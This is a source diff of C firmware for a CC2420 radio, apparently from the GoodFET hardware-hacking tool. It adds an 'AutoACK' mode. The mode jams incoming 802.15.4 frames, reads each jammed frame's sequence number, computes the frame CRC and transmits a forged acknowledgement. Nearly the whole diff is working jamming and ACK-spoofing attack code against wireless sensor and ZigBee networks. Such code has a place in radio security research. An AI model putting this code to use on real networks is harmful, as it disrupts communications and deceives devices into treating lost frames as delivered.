@@ -203,7 +203,7 @@ void ccspi_handle_fn( uint8_t const app,
         SETSS;
 
         //Load the jamming packet.
-        //TODO try to preload this to get faster effects
+        //Note: attempts to preload this actually slowed the jam time down from 7 to 9 bytes.
         CLRSS;
         ccspitrans8(CCSPI_TXFIFO);
         char pkt[15] = {0x0f, 0x01, 0x08, 0x82, 0xff, 0xff, 0xff, 0xff, 0xde, 0xad, 0xbe, 0xef, 0xba, 0xbe, 0xc0};
@@ -233,12 +233,13 @@ void ccspi_handle_fn( uint8_t const app,
     txdata(app,NOK,0);
 #endif
 
-  case CCSPI_REFLEX_SEQNUM:
+  case CCSPI_REFLEX_AUTOACK:
 #if defined(FIFOP) && defined(SFD) && defined(FIFO) && defined(PLED2DIR) && defined(PLED2PIN) && defined(PLED2OUT)
-    //char byte[4];
+    //txdata(app, verb, 1);
+    debugstr("AutoACK");
+    char byte[4];
     while(1) {
         //Has there been an overflow in the RX buffer?
-        //TODO do we really need to check this??
         if((!FIFO)&&FIFOP){
           //debugstr("Clearing overflow");
           CLRSS;
@@ -251,6 +252,29 @@ void ccspi_handle_fn( uint8_t const app,
         //Turn on LED 2 (green) as signal
 	    PLED2DIR |= PLED2PIN;
 	    PLED2OUT &= ~PLED2PIN;
+
+        //Put radio in TX mode
+        //Note: Not doing this slows down jamming, so can't jam short packets.
+        //      However, if we do this, it seems to mess up our RXFIFO ability.
+        //CLRSS;
+        //ccspitrans8(0x04);
+        //SETSS;
+        //Load the jamming packet
+        CLRSS;
+        ccspitrans8(CCSPI_TXFIFO);
+        char pkt[7] = {0x07, 0x01, 0x08, 0xff, 0xff, 0xff, 0xff};
+        for(i=0;i<pkt[0];i++)
+          ccspitrans8(pkt[i]);
+        SETSS;
+        //Transmit the jamming packet
+        CLRSS;
+        ccspitrans8(0x04);  //STXON
+        SETSS;
+        msdelay(200);       //Instead of examining SFD line status
+        //Flush TX buffer.
+        CLRSS;
+        ccspitrans8(0x09);  //SFLUSHTX
+        SETSS;
 
         //Get the orignally received packet, up to the seqnum field.
         CLRSS;
@@ -265,30 +289,50 @@ void ccspi_handle_fn( uint8_t const app,
         //Send the sequence number of the jammed packet back to the client
         //itoa(cmddata[3], byte, 16);
         //debugstr(byte);
-        txdata(app,verb,cmddata[3]);
+        //txdata(app,verb,cmddata[3]);
 
-        //Put radio in TX mode
-        CLRSS;
-        ccspitrans8(0x04);
-        SETSS;
+        //TODO turn on AUTOCRC for it to apply to the TX???
+        //     this may overcome issues of bad crc / length issues?
+        //mdmctrl0 (0x11) register set bit 5 to true.
 
-        //Load the packet.
+        //Create the forged ACK packet
+        cmddata[0] = 6;     //length of ack frame plus length
+        cmddata[1] = 0x02;  //first byte of FCF
+        cmddata[2] = 0x00;  //second byte of FCF
+        //[3] is already filled with the sequence number
+        int crc = 0;
+        for(i=1;i<4;i++) {
+            int c = cmddata[i];
+            int q = (crc ^ c) & 15;   		//Do low-order 4 bits
+            crc = (crc / 16) ^ (q * 4225);
+            q = (crc ^ (c / 16)) & 15;		//And high 4 bits
+            crc = (crc / 16) ^ (q * 4225);
+        }
+        cmddata[4] = crc & 0xFF;
+        cmddata[5] = (crc >> 8) & 0xFF;
+
+        for(i=0;i<cmddata[0];i++) {
+            itoa(cmddata[i], byte, 16);
+            debugstr(byte);
+        }
+        //Load the forged ACK packet
         CLRSS;
         ccspitrans8(CCSPI_TXFIFO);
-        char pkt[12] = {0x0c, 0x01, 0x08, 0x82, 0xff, 0xff, 0xff, 0xff, 0xde, 0xad, 0xbe, 0xef};
-        for(i=0;i<pkt[0];i++)
-          ccspitrans8(pkt[i]);
+        for(i=0;i<cmddata[0];i++)
+          ccspitrans8(cmddata[i]);
         SETSS;
-
-        //Transmit the packet.
+        //Transmit the forged ACK packet
+        while(SFD);
         CLRSS;
         ccspitrans8(0x04);  //STXON
         SETSS;
-        msdelay(200);       //Instead of examining SFD line status
-        //Flush TX buffer.
+        msdelay(200);       //TODO try doing this based on SFD line status instead
+        //Flush TX buffer
         CLRSS;
         ccspitrans8(0x09);  //SFLUSHTX
         SETSS;
+
+        //TODO disable AUTOCRC here again to go back to promiscous mode
 
         //Turn off LED 2 (green) as signal
 	    PLED2DIR |= PLED2PIN;
